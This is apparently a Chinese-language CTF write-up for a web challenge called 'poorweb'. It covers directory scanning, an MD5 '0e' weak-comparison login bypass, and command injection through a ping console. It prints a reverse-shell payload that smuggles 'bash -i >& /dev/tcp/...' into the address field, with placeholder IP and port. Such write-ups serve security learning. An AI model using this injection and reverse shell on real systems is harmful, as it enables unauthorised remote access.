# poorweb WP

## 考点

网站目录扫描，md5绕过，RCE，反弹shell

## WP

用dirsearch扫出config.ini，查看，得到admin和textuser的用户名和密码md5。其中textuser的md5能通过https://www.somd5.com/反解出来，但没有什么用。（如果用textuser登录会无法注销，需要用浏览器删除cookie才可以退出登录）admin的md5密码注意到头两位是0e，猜测后端用的==弱类型判断，选取一个md5值头两位为0e的字符串绕过直接进入后台界面。

发现后台界面是一个控制台，要求你输入一个网址，如果是正常的网址会返回ping的时间，如果输错了会告诉你无法连接。猜测后台用的是exec(ping)函数，由于无回显，所以可以直接反弹shell，弹过去后直接`cat /flag`拿到flag.

payload是`127.0.0.1|bash -i >& /dev/tcp/xx.xx.xx.xxx/xxx 0>&1`

xx部分填自己服务器的ip和端口就行。

